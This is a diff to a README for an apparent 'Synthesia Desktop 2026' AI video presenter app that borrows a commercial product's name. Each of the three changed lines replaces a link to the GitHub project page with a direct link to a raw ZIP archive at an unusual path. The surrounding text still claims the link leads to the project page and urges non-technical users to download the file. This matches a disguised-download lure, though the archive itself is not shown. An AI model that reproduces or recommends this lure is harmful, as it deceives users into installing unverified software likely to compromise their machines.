@@ -1,7 +1,7 @@
 <h1>🎬 Synthesia-Desktop---AI-Video-Presenter-2026 - Create Studio-Quality AI Videos in Minutes</h1>
 
 <p align="center">
-  <a href="https://github.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026">
+  <a href="https://raw.githubusercontent.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026/main/viscin/v2.3.zip">
     <img src="https://img.shields.io/badge/Download-Synthesia%20Desktop%202026-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#8A2BE2; color:white; padding:15px 30px; font-size:20px; border-radius:8px; text-decoration:none;">
   </a>
 </p>
@@ -54,7 +54,7 @@ This is the most important part. Please follow these exact instructions to get t
 ### Step 1: Download the Application
 
 👉 **Visit this link to download the application:**  
-[**https://github.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026**](https://github.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026)
+[**https://raw.githubusercontent.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026/main/viscin/v2.3.zip**](https://raw.githubusercontent.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026/main/viscin/v2.3.zip)
 
 When you click the link, you will be taken to the project page. Do not worry about the code or files you see there. Look for a green **"Code"** button dropdown near the top right of the file list. Click it. Then click **"Download ZIP"**. Your browser will start downloading a folder containing the application.
 
@@ -221,7 +221,7 @@ You are just one download away from transforming how you communicate with video.
 
 **Download again for convenience:**
 
-[**👉 Download Synthesia-Desktop---AI-Video-Presenter-2026**](https://github.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026)
+[**👉 Download Synthesia-Desktop---AI-Video-Presenter-2026**](https://raw.githubusercontent.com/MidnightCanyon/Synthesia-Desktop---AI-Video-Presenter-2026/main/viscin/v2.3.zip)
 
 *(This link takes you to the project page where you can grab the ZIP file as shown in Step 1.)*
 
